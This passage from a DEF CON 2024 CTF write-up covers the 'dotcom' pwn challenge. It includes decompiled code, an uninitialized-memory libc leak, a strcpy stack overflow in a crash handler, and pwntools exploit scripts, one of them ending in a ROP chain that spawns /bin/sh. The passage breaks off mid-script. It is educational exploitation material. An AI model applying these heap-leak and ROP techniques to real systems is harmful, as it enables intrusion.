</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc &#34;</span><span style="color:#f92672">+</span>hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x6c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x81</span><span style="color:#e6db74">&#34;</span> 
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002a3e5</span>) <span style="color:#f92672">+</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))) 
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002be51</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000011f2e7</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>execve)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(pay<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">255</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;./submitter&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LiveCTF{&#39;</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Flag: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, flag)
</span></span></code></pre></div><h1 id="pwn---dotcom">Pwn - dotcom</h1>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-5">Source-code overview</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/dotcom                                                                                                                                  00:41:22
</span></span><span style="display:flex;"><span>╰──➤ tree .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>├── airbag
</span></span><span style="display:flex;"><span>├── bailout
</span></span><span style="display:flex;"><span>├── Dockerfile
</span></span><span style="display:flex;"><span>├── dotcom_market
</span></span><span style="display:flex;"><span>├── libc.so.6
</span></span><span style="display:flex;"><span>├── packages.txt
</span></span><span style="display:flex;"><span>├── run_on_socket.sh
</span></span><span style="display:flex;"><span>├── seccomp.txt
</span></span><span style="display:flex;"><span>└── start.sh
</span></span></code></pre></div><p>This challenge looks like the typical notes challenge, and there is a seccomp filter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(rt_sigreturn),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(read),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(write),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(close),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(lseek),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mmap),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(msync),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mprotect),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(memfd_create),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mremap),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(munmap),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(readv),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(writev),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(pipe),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(select),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(dup),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(dup2),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(nanosleep),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(alarm),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(getpid),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(gettid),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(sendfile),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(fork),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(clone),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(exit),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mkdir),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(brk),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(clock_nanosleep),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(mkdirat),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(exit_group),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(newfstatat),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(rt_sigprocmask),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(getrandom),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ALLOW_SYSCALL</span>(tgkill),
</span></span></code></pre></div><p>It begins with installing some crash handlers and also opens the flag file. So, if we can control the flow, we can easily read the flag file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">feenableexcept</span>(<span style="color:#ae81ff">13</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">11</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">6</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/flag1.txt&#34;</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_permissions</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">create_new_graph</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="vulnerabilities">Vulnerabilities</h2>
<h3 id="uninitialized-memory">Uninitialized Memory</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  m <span style="color:#f92672">=</span> (market_model_0 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(end <span style="color:#f92672">-</span> p <span style="color:#f92672">+</span> <span style="color:#ae81ff">49</span>);
</span></span><span style="display:flex;"><span>  has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">0</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>supply <span style="color:#f92672">=</span> values[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">1</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>demand <span style="color:#f92672">=</span> values[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">2</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>income <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.0</span> <span style="color:#f92672">*</span> values[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">3</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>employment <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.0</span> <span style="color:#f92672">*</span> values[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">4</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>confidence <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.0</span> <span style="color:#f92672">*</span> values[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>has_any )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Error! Invalid model format, all values are NAN&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">abort</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(m<span style="color:#f92672">-&gt;</span>notes, p, note_len);
</span></span><span style="display:flex;"><span>  m<span style="color:#f92672">-&gt;</span>notes[note_len] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>model_list[i] )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      model_list[i] <span style="color:#f92672">=</span> m;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Loaded model #%02lu... </span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[30;40m@%p</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, m);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> m;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Since the value doesn&rsquo;t overwrite when they are NaN and because after malloc, the memory isn&rsquo;t properly initialized. So we can leverage this to leak through <code>draw_graph</code> function.</p>
<p>First, I created 2 chunks of 0x400 size, then free 1 to make it into the unsorted bin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; bins
</span></span><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>fastbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>unsortedbin
</span></span><span style="display:flex;"><span>all: 0xca62a0 —▸ 0x791d8281ace0 <span style="color:#f92672">(</span>main_arena+96<span style="color:#f92672">)</span> ◂— 0xca62a0
</span></span><span style="display:flex;"><span>smallbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>largebins
</span></span><span style="display:flex;"><span>empty
</span></span></code></pre></div><p>So basically, allocate again and select the module 1 to leak our libc address</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./dotcom_market&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* free
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;dotcom.shellweplayaga.me&#34;</span>, <span style="color:#ae81ff">10001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./dotcom_market&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">import_module</span>(model):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, model)    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trasting</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;66&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0|0|0|0|0|&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>trasting(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NaN <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;Q&#34;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, float(<span style="color:#e6db74">&#39;nan&#39;</span>)))[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>print(hex(NaN))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> str(NaN)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|0|0|0|0|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;r = &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>supply <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0BFA999999999999A</span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> float(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>packed_value <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;Q&#39;</span>, supply)
</span></span><span style="display:flex;"><span>supply_coefficient <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;d&#39;</span>, packed_value)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, leak <span style="color:#f92672">/</span> supply_coefficient)) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">0xfff</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21a000</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="stack-overflow">Stack overflow</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">find_abort_string</span>(<span style="color:#66d9ef">uint64_t</span> rsp_0)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-3Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>p; <span style="color:#75715e">// [rsp+18h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> format[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint64_t</span> rsp_0a; <span style="color:#75715e">// [rsp+40h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  rsp_0a <span style="color:#f92672">=</span> rsp_0;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(format, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(format));
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)rsp_0a;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">500</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>p <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>essA :)(<span style="color:#960050;background-color:#1e0010">&#39;</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcpy</span>(format, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)p);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strdup</span>(format);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>p;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In the crash handler, there is an obvious stack overflow when parsing the abort message cuz it uses the <code>strcpy</code> function.</p>
<p>Since strcpy terminates when it encounters a null byte, we can&rsquo;t perform a rop chain, so I will choose the following gadget to cause stack overflow again. Fortunately, the stack address remains in the RDI register.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>A1                 mov     rax, cs:stdin_ptr
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>A8                 mov     rdx, [rax]      ; stream
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>AB                 mov     esi, <span style="color:#ae81ff">0</span>C8h       ; n
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>B0                 call    _fgets
</span></span></code></pre></div><h2 id="solve-script-4">Solve script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./dotcom_market&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* crash_handler
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;dotcom.shellweplayaga.me&#34;</span>, <span style="color:#ae81ff">10001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./dotcom_market&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">import_module</span>(model):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
